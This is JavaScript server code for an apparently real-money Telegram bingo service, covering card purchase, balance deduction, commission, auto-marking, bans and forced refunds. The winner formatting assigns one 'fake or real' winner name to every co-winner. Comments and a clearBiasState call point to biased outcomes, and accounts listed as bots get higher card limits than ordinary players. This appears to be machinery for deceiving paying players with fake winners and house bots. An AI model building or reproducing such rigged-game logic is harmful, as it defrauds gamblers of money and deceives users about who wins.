export async function updateAutoMarkForBall(stake, number, roomNumber = 1) {
  const session = await prisma.bingoSession.findUnique({
    where: { stake_roomNumber: { stake, roomNumber } },
    include: { players: true },
  });

  if (!session || session.status !== "active") return;

  // Update each player with auto-mark enabled
  for (const player of session.players) {
    if (!player.autoMark) continue;

    const cardNumbers = JSON.parse(player.cardNumbers);
    const markedCells = JSON.parse(player.markedCells);

    // Check if this number is on their card
    const cellIndex = cardNumbers.indexOf(number);
    if (cellIndex !== -1 && !markedCells.includes(cellIndex)) {
      markedCells.push(cellIndex);

      // Update player's marked cells
      await prisma.bingoSessionPlayer.update({
        where: { id: player.id },
        data: { markedCells: JSON.stringify(markedCells) },
      });
    }
  }
}

/**
 * Get session details
 * @param {number} stake - Stake level
 * @returns {Promise<Object>} Session data
 */
export async function getSessionDetails(stake, roomNumber = 1) {
  const session = await prisma.bingoSession.findUnique({
    where: { stake_roomNumber: { stake, roomNumber } },
    include: {
      players: {
        include: {
          user: { select: { id: true, name: true, username: true } },
        },
      },
    },
  });

  if (!session) return null;

  return formatSession(session);
}

/**
 * Force finish a session and refund all joined cards.
 * Each selected card is refunded by stake amount back to currentBalance.
 */
export async function forceFinishSessionWithRefund(stake, roomNumber = 1) {
  const session = await prisma.bingoSession.findUnique({
    where: { stake_roomNumber: { stake, roomNumber } },
    include: { players: true },
  });

  if (!session) {
    throw new Error("Session not found");
  }

  if (session.status === "finished") {
    return {
      session,
      refundedPlayers: 0,
      refundedCards: 0,
      refundedAmount: 0,
      alreadyFinished: true,
    };
  }

  const refundsByUser = new Map();
  for (const player of session.players || []) {
    refundsByUser.set(
      player.userId,
      (refundsByUser.get(player.userId) || 0) + stake,
    );
  }

  const refundedCards = (session.players || []).length;
  const refundedPlayers = refundsByUser.size;
  const refundedAmount = stake * refundedCards;
  const finishedAt = new Date();

  const txResult = await prisma.$transaction(async (tx) => {
    // Lock finish transition so only one caller performs refunds.
    const finishLock = await tx.bingoSession.updateMany({
      where: {
        stake,
        roomNumber,
        status: { not: "finished" },
      },
      data: {
        status: "finished",
        countdownEndsAt: null,
        finishedAt,
        winnerId: null,
        winnerCardId: null,
        winnerName: null,
        winPattern: null,
        winningCells: null,
        totalPrize: null,
        winnersCount: 0,
      },
    });

    if (finishLock.count === 0) {
      const alreadyFinishedSession = await tx.bingoSession.findUnique({
        where: { stake_roomNumber: { stake, roomNumber } },
      });
      return {
        session: alreadyFinishedSession,
        alreadyFinished: true,
        didRefund: false,
      };
    }

    for (const [userId, refundAmount] of refundsByUser.entries()) {
      const balance = await tx.userBalance.findUnique({ where: { userId } });

      if (!balance) {
        await tx.userBalance.create({
          data: {
            userId,
            currentBalance: refundAmount,
            totalDeposits: 0,
            totalLosses: 0,
          },
        });
        continue;
      }

      const lossesReduction = Math.min(balance.totalLosses || 0, refundAmount);

      await tx.userBalance.update({
        where: { userId },
        data: {
          currentBalance: { increment: refundAmount },
          totalLosses: { decrement: lossesReduction },
        },
      });
    }

    const finalizedSession = await tx.bingoSession.findUnique({
      where: { stake_roomNumber: { stake, roomNumber } },
    });

    return {
      session: finalizedSession,
      alreadyFinished: false,
      didRefund: true,
    };
  });

  if (txResult.didRefund && refundedAmount > 0) {
    await refundStake("BINGO", refundedAmount);
    await refundCommission("BINGO", refundedAmount * 0.1);
  }

  if (txResult.didRefund) {
    clearBiasState(stake, roomNumber, session.id);
  }

  return {
    session: txResult.session,
    refundedPlayers: txResult.didRefund ? refundedPlayers : 0,
    refundedCards: txResult.didRefund ? refundedCards : 0,
    refundedAmount: txResult.didRefund ? refundedAmount : 0,
    alreadyFinished: txResult.alreadyFinished,
  };
}

function formatSession(session) {
  return {
    id: session.id,
    stake: session.stake,
    roomNumber: session.roomNumber,
    status: session.status,
    calledNumbers: JSON.parse(session.calledNumbers),
    countdownEndsAt: session.countdownEndsAt?.getTime() || null,
    players: session.players.map((p) => ({
      userId: p.userId,
      name: p.user.name || p.user.username || `User ${p.userId}`,
      cardId: p.cardId,
      cardNumbers: normalizeCardNumbers(JSON.parse(p.cardNumbers)),
      markedCells: JSON.parse(p.markedCells),
      autoMark: p.autoMark,
    })),
    winner: session.winnerId
      ? (() => {
          const baseWinner = {
            userId: session.winnerId,
            name: session.winnerName,
            cardId: session.winnerCardId,
            cardNumbers: session.players.find(
              (p) => p.cardId === session.winnerCardId,
            )
              ? normalizeCardNumbers(
                  JSON.parse(
                    session.players.find(
                      (p) => p.cardId === session.winnerCardId,
                    ).cardNumbers,
                  ),
                )
              : [],
            pattern: session.winPattern,
            winningCells: JSON.parse(session.winningCells || "[]"),
          };
          // Include multiple-winner data when there are multiple winners
          if (session.winnersCount && session.winnersCount > 1) {
            baseWinner.multipleWinners = true;
            baseWinner.winnersCount = session.winnersCount;
            baseWinner.totalPrize = session.totalPrize;
            baseWinner.individualPrize = Math.floor(
              session.totalPrize / session.winnersCount,
            );
            // Build winners array from session players who have a prize
            // Always use session.winnerName for all winners if bias is possible
            baseWinner.winners = session.players
              .filter((p) => p.prize && p.prize > 0)
              .map((p) => ({
                userId: p.userId,
                winnerName: session.winnerName, // Always use the resolved winnerName (fake or real)
                cardId: p.cardId,
                cardNumbers: normalizeCardNumbers(JSON.parse(p.cardNumbers)),
                prize: p.prize,
                bonus: 0,
                totalAwarded: p.prize,
                pattern: session.winPattern,
                winningCells: JSON.parse(session.winningCells || "[]"),
              }));
          }
          return baseWinner;
        })()
      : null,
  };
}

// In-memory session bans: { [stake_roomNumber]: Set<userId> }
const sessionBans = {};

/**
 * Ban a user for the current bingo session (not persistent)
 * @param {number} stake - Stake level
 * @param {number|string} userId - User ID
 * @param {number} roomNumber - Room number (default 1)
 */
export async function banUserForSession(stake, userId, roomNumber = 1) {
  const key = `${stake}_${roomNumber}`;
  if (!sessionBans[key]) sessionBans[key] = new Set();
  sessionBans[key].add(Number(userId));
}

/**
 * Check if a user is banned for the current bingo session
 * @param {number} stake - Stake level
 * @param {number|string} userId - User ID
 * @param {number} roomNumber - Room number (default 1)
 * @returns {boolean}
 */
export function isUserBannedForSession(stake, userId, roomNumber = 1) {
  const key = `${stake}_${roomNumber}`;
  return sessionBans[key] && sessionBans[key].has(Number(userId));
}

/**
 * OPTIMIZED: Select multiple cards in a single transaction
 * @param {number} stake - Stake level
 * @param {number|string} userId - User ID
 * @param {number[]} cardIds - Array of card IDs
 * @returns {Promise<Object[]>} Array of player objects
 */
/**
 * Select multiple cards for a user (FIXED: Atomic transaction with proper locking)
 * @param {number} stake - Stake level
 * @param {number} userId - User ID (from JWT, integer)
 * @param {number[]} cardIds - Array of card IDs to select
 * @returns {Promise<Array>} Created players
 */
export async function selectMultipleCards(stake, userId, cardIds) {
  const dbUserId = Number(userId);
  if (!Array.isArray(cardIds) || cardIds.length === 0) {
    throw new Error("cardIds must be a non-empty array");
  }

  // Deduplicate card IDs
  const uniqueCardIds = [...new Set(cardIds)];

  // Get or create session first (outside transaction)
  const session = await getOrCreateSession(stake);

  // Validate all cards exist and belong to this stake
  const cards = await prisma.bingoCard.findMany({
    where: {
      AND: [{ stake }, { cardId: { in: uniqueCardIds } }],
    },
  });

  if (cards.length !== uniqueCardIds.length) {
    throw new Error("One or more invalid cards");
  }

  const totalStake = stake * uniqueCardIds.length;

  // Single atomic transaction for ALL operations
  const result = await prisma.$transaction(
    async (tx) => {
      // 1. Check total cards user will have (max 5 per session)
      const existingCards = await tx.bingoSessionPlayer.findMany({
        where: {
          sessionId: session.id,
          userId: dbUserId,
        },
        select: { cardId: true },
      });

      let maxAllowed = 5;
      try {
        const userRow = await tx.user.findUnique({
          where: { id: dbUserId },
          select: { telegramId: true },
        });
        const telegramId = String(userRow?.telegramId || "");
        const botAccounts = (process.env.BOT_ACCOUNTS || "")
          .split(",")
          .map((s) => s.trim())
          .filter(Boolean);
        if (telegramId && botAccounts.includes(telegramId)) {
          const cfg = demoBotConfig.getConfig();
          maxAllowed = Math.max(5, Number(cfg.maxCards || 5));
        }
      } catch (err) {
        // ignore and fallback to default
      }

      const totalCards = existingCards.length + uniqueCardIds.length;
      if (totalCards > maxAllowed) {
        throw new Error(
          `Cannot select ${uniqueCardIds.length} more cards. You already have ${existingCards.length} cards. Maximum is ${maxAllowed} cards per session.`,
        );
      }

      // 2. Check if any card is already taken
      const takenCards = await tx.bingoSessionPlayer.findMany({
        where: {
          sessionId: session.id,
          cardId: { in: uniqueCardIds },
        },
        select: { cardId: true },
      });

      if (takenCards.length > 0) {
        const takenIds = takenCards.map((c) => c.cardId).join(", ");
        throw new Error(`Cards already taken: ${takenIds}`);
      }

      // 3. Get user balances with lock
      const [userBalance, userProfile] = await Promise.all([
        tx.userBalance.findUnique({
          where: { userId: dbUserId },
        }),
        tx.user.findUnique({
          where: { id: dbUserId },
          select: { rewardBalance: true, banned: true },
        }),
      ]);

      // 4. Check if user is banned
      if (userProfile?.banned) {
        throw new Error("User is banned and cannot play games");
      }

      const realBalance = userBalance?.currentBalance || 0;
      const rewardBalance = userProfile?.rewardBalance || 0;
      const totalBalance = realBalance + rewardBalance;

      if (totalBalance < totalStake) {
        throw new Error("Insufficient balance to select these cards");
      }

      // 5. Calculate deduction from each balance type
      const realDeduct = Math.min(realBalance, totalStake);
      const rewardDeduct = Math.max(0, totalStake - realBalance);

      // 6. Deduct balance ONCE (not per card)
      if (realDeduct > 0) {
        await tx.userBalance.update({
          where: { userId: dbUserId },
          data: {
            currentBalance: { decrement: realDeduct },
            totalLosses: { increment: realDeduct },
          },
        });
      }

      if (rewardDeduct > 0) {
        await tx.user.update({
          where: { id: dbUserId },
          data: {
            rewardBalance: { decrement: rewardDeduct },
          },
        });
      }

      // 7. Increment play counts ONLY on first card selection (not for additional cards)
      let didFirstPlay = false;
      if (existingCards.length === 0) {
        // First card(s) selection for this user in this session
        await tx.user.update({
          where: { id: dbUserId },
          data: {
            numberOfTotalPlay: { increment: 1 },
            rewardPlay: { increment: 1 },
            rewardChallenge: { increment: 1 },
          },
        });
        didFirstPlay = true;
      }

      // 8. Create all players in batch
      const playerData = uniqueCardIds.map((cardId) => ({
        sessionId: session.id,
        userId: dbUserId,
        cardId,
        cardNumbers: cards.find((c) => c.cardId === cardId)?.numbers || [],
        autoMark: true,
      }));

      await tx.bingoSessionPlayer.createMany({
        data: playerData,
      });

      // 9. Fetch created players with user info
      const createdPlayers = await tx.bingoSessionPlayer.findMany({
        where: {
          sessionId: session.id,
          userId: dbUserId,
        },
        include: {
          user: { select: { id: true, name: true, username: true } },
        },
      });

      return { createdPlayers, didFirstPlay };
    },
    {
      isolationLevel: "Serializable", // Prevent race conditions
      timeout: 15000, // 15 second timeout
    },
  );

  // 10. Record analytics ONCE (outside transaction)
  await incrementStake("BINGO", totalStake);
  await incrementCommission("BINGO", totalStake * 0.1);

  // 10.1. Update leaderboard for play if first play in session
  if (result.didFirstPlay) {
    await updateLeaderboardStat(dbUserId, "PLAY");
  }

  // 11. Check if we should start countdown
  const updatedSession = await fetchSession(stake, session.roomNumber);
  const playerCount = updatedSession?._count?.players || 0;

  if (
    playerCount >= 2 &&
    updatedSession &&
    updatedSession.status === "waiting"
  ) {
    await startCountdown(stake, session.roomNumber);
  }

  return result.createdPlayers.map((player) => ({
    ...player,
    roomNumber: session.roomNumber,
  }));
}
